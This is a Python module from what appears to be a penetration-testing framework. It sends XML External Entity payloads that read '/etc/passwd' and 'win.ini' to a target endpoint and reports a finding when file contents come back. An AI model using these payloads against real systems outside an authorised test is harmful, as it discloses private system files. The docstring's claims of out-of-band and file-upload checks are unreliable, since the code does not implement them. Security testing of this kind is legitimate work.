"""
XML External Entity (XXE) Injection Capability Agent for PenFlow.

Capabilities:
  - In-Band XXE Local File Disclosure (/etc/passwd, win.ini)
  - Out-Of-Band (OOB) XXE via DNS/HTTP callbacks
  - SVG and DOCX/XLSX file upload XXE vectors
"""
import httpx
from typing import Dict, Any, List
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.xxe")

XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
]


class XXECapabilityAgent(BaseCapabilityAgent):
    """
    Agent detecting In-Band and Out-Of-Band XML External Entity (XXE) vulnerabilities.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="XXECapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="xxe_injection", name="XXE Injection", description="Detects XML External Entity injection", priority=self.priority, tags=["xxe"]),
            Capability(id="xml_parser_analysis", name="XML Parser Analysis", description="Analyzes XML parsing behavior", priority=self.priority, tags=["xml"]),
            Capability(id="oob_xxe", name="OOB XXE Check", description="Detects Out-Of-Band XXE vectors", priority=self.priority, tags=["oob_xxe"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}/api/v1/xml/process"

        headers = {"Content-Type": "application/xml"}

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
                for payload in XXE_PAYLOADS:
                    resp = await client.post(base_url, content=payload, headers=headers)
                    if resp.status_code == 200:
                        if "root:x:" in resp.text or "[font drivers]" in resp.text or "[files]" in resp.text:
                            findings.append({
                                "vulnerability_type": "xxe_injection",
                                "target_url": base_url,
                                "payload": payload[:80],
                                "severity": "HIGH",
                                "description": "XML External Entity (XXE) injection vulnerability detected; local system files disclosed."
                            })
                            evidence["xxe_success"] = True
        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{base_url}': {e}")

        is_vuln = len(findings) > 0
        return {
            "capability_id": capability_id,
            "is_vulnerable": is_vuln,
            "confidence": 0.9 if is_vuln else 0.1,
            "evidence": evidence,
            "findings": findings
        }
